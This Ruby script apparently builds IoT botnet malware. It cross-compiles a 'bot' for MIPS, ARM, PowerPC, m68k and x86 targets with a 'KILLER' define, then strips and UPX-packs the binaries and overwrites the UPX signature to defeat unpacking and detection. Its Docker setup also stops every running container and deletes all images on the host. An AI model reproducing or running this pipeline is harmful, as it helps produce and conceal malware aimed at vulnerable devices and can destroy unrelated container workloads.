DOCKER_NAME = "con"
DOCKER_TAG = "cross"

FLAGS = "methods/*.cc *.cc -static -flto -Os -s -fno-ident -DDEBUG -DKILLER"

ARCHS = {
    "mips" => "clang++ -target mips-linux-gnu -o mips.con",
    "mipsel" => "clang++ -target mipsel-linux-gnu -o mipsel.con",
    "i686" => "clang++ -m32 -o i686.con",
    "x86_64" => "clang++ -o x86_64.con",
}

INIT_DOCKER = [
    "docker stop $(docker ps -q)",
    "echo y | docker system prune",
    "docker rm #{DOCKER_NAME}",
    "docker rmi $(docker images -aq)",
    "docker build -t #{DOCKER_TAG} . -f ./scripts/Dockerfile",
    "docker run --name #{DOCKER_NAME} -d #{DOCKER_TAG}",
]

COPY = [
    "/home/root/bot/mips.con ./bin/mips.con",
    "/home/root/bot/mipsel.con ./bin/mipsel.con",
    "/home/root/bot/ppc.con ./bin/ppc.con",
    "/home/root/bot/i686.con ./bin/i686.con",
    "/home/root/bot/armv5.con ./bin/armv5.con",
    "/home/root/bot/armv6.con ./bin/armv6.con",
    "/home/root/bot/armv7.con ./bin/armv7.con",
    "/home/root/bot/armv8.con ./bin/armv8.con",
    "/home/root/bot/x86_64.con ./bin/x86_64.con",
]

BIN_INSTRUCTIONS = [
    "strip ./bin/*.con",
    "upx -9 ./bin/*.con",
    "sed -i 's/UPX!/DDD!/g' ./bin/*.con"
]

def docker_execute(command, flags)
    puts "[+] RUNNING docker exec -it #{DOCKER_NAME} /bin/bash -c '#{command} #{flags}'"
    system("docker exec -it #{DOCKER_NAME} /bin/bash -c '#{command} #{flags}'")
end

def execute(command)
    puts "[+] RUNNING (local) #{command}"
    system(command)
end

def main
    execute("touch bot/instructions.bash")
    fd = File.open("bot/instructions.bash", "wb")

    ARCHS.each do |key, value|
        fd.write("#{value} #{FLAGS} -DARCH='\"#{key}\"'\n")
    end
    
    fd.write("sudo apt-get install -y g++-arm-linux-gnueabi\n")
    fd.write("arm-linux-gnueabi-g++ -march=armv5t -o armv5.con #{FLAGS} -DARCH='\"armv5\"'\n")
    fd.write("arm-linux-gnueabi-g++ -march=armv6 -o armv6.con #{FLAGS} -DARCH='\"armv6\"'\n")
    fd.write("arm-linux-gnueabi-g++ -march=armv7 -o armv7.con #{FLAGS} -DARCH='\"armv7\"'\n")
    fd.write("arm-linux-gnueabi-g++ -march=armv8-a -o armv8.con #{FLAGS} -DARCH='\"armv8\"'\n")
    fd.write("g++-m68k-linux-gnu -o m68k.con #{FLAGS} -DARCH='\"m68k\"'\n")

    fd.write("sudo apt-get install -y g++-powerpc-linux-gnu\n")
    fd.write("powerpc-linux-gnu-g++ -o ppc440fp.con -mcpu=440fp #{FLAGS} -DARCH='\"ppc440fp\"'\n")
    fd.write("powerpc-linux-gnu-g++ -o ppc.con #{FLAGS} -DARCH='\"ppc\"'\n")

    fd.close


    docker()
    end_program()
end

def docker
    execute("rm -rf ./bin/")
    execute("mkdir ./bin/")

    INIT_DOCKER.each do |command|
        execute(command)
    end

    docker_execute("ls", "")

    docker_execute("bash instructions.bash", "")

    COPY.each do |path|
        execute("docker cp #{DOCKER_NAME}:#{path}")
    end
end

def end_program
    BIN_INSTRUCTIONS.each do |instruction|
        puts instruction
        result = `#{instruction}`
        puts result
    end

    File.delete("./bot/instructions.bash")

    puts "====================================="
    puts "                 DONE"
    puts "====================================="
end

main()
